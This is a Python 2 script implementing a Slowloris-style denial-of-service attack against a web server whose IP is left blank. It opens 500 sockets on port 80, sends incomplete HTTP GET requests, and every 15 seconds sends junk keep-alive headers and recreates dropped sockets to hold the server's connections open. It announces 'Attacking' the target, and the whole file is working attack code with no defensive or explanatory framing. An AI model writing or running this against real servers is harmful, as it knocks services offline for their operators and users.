import socket
import random
import time

ip = ""
socket_count = 500
port = 80

regular_headers = [
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Accept-language: en-US,en,q=0.5"
]


def init_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip, port))

    s.send("GET /?%s HTTP/1.1\r\n" % random.randint(0, 2000))
    for header in regular_headers:
        s.send("%s\r\n" % header)
    return s


def main():
    list_of_sockets = []

    print "Attacking %s with %s sockets." % (ip, socket_count)

    print "Creating sockets..."
    for _ in range(socket_count):
        print "Creating socket nr", _
        s = init_socket()
        if s:
            list_of_sockets.append(s)

    while True:
        print "Sending keep-alive headers... Socket count:", len(list_of_sockets)
        for s in list(list_of_sockets):
            s.send("X-a: %s\r\n" % random.randint(1, 5000))

        for _ in range(socket_count - len(list_of_sockets)):
            print "Recreating socket..."
            s = init_socket()
            if s:
                list_of_sockets.append(s)
        time.sleep(15)


if __name__ == "__main__":
    main()
